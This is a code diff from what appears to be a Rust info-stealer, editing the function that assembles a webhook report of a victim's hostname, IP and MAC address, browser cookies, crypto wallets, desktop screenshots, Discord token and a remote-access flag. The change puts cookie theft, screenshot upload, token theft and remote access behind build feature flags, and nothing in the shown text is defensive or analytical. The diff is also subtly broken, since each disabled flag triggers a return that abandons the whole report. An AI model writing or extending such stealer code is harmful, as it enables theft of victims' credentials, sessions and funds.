@@ -21,10 +21,14 @@ pub async fn send_hook() {
                         value: format!("Hostname: {:?}\nIP Address: {:?}\nMAC Address: {:?}", grab::get_host(), ip, grab::get_mac()),
                         inline: false,
                     },
-                    WebhookField {
-                        name: "Browser Cookies".to_string(),
-                        value: format!("{:?}", grab::grab_cookies().await.unwrap().join(", ")),
-                        inline: false,
+                    if cfg!(feature = "grab_cookies") {
+                        WebhookField {
+                            name: "Browser Cookies".to_string(),
+                            value: format!("{:?}", grab::grab_cookies().await.unwrap().join(", ")),
+                            inline: false,
+                        }
+                    } else {
+                        return
                     },
                     WebhookField {
                         name: "Crypto Wallets".to_string(),
@@ -51,26 +55,38 @@ pub async fn send_hook() {
                         value: "".to_string(),
                         inline: false,
                     },
-                    WebhookField {
-                        name: "Desktop Screenshot(s)".to_string(),
-                        value: format!("{:?}", grab::screenshot_desktop_and_upload().await.unwrap().join(", ")),
-                        inline: false,
+                    if cfg!(feature = "desktop_screenshot") {
+                        WebhookField {
+                            name: "Desktop Screenshot(s)".to_string(),
+                            value: format!("{:?}", grab::screenshot_desktop_and_upload().await.unwrap().join(", ")),
+                            inline: false,
+                        }
+                    } else {
+                        return
                     },
-                    WebhookField {
-                        name: "Discord Token".to_string(),
-                        value: format!("`{}`", grab::grab_discord_token().await.unwrap().join("")),
-                        inline: false,
+                    if cfg!(feature = "grab_discord_token") {
+                        WebhookField {
+                            name: "Discord Token".to_string(),
+                            value: format!("`{}`", grab::grab_discord_token().await.unwrap_or(["Failed to get Discord token".to_string()].to_vec()).join("")),
+                            inline: false,
+                        }
+                    } else {
+                        return
                     },
                     WebhookField {
                         name: "Minecraft SSID".to_string(),
                         value: "".to_string(),
                         inline: false,
                     },
-                    WebhookField {
-                        name: "Growtopia save.dat".to_string(),
-                        value: "".to_string(),
-                        inline: false,
-                    },
+                    if cfg!(feature = "remote_access") {
+                        WebhookField {
+                            name: "Remote Enabled:".to_string(),
+                            value: "Yes".to_string(),
+                            inline: false,
+                        }
+                    } else {
+                        return
+                    }
                 ].to_vec(),
             }];
 
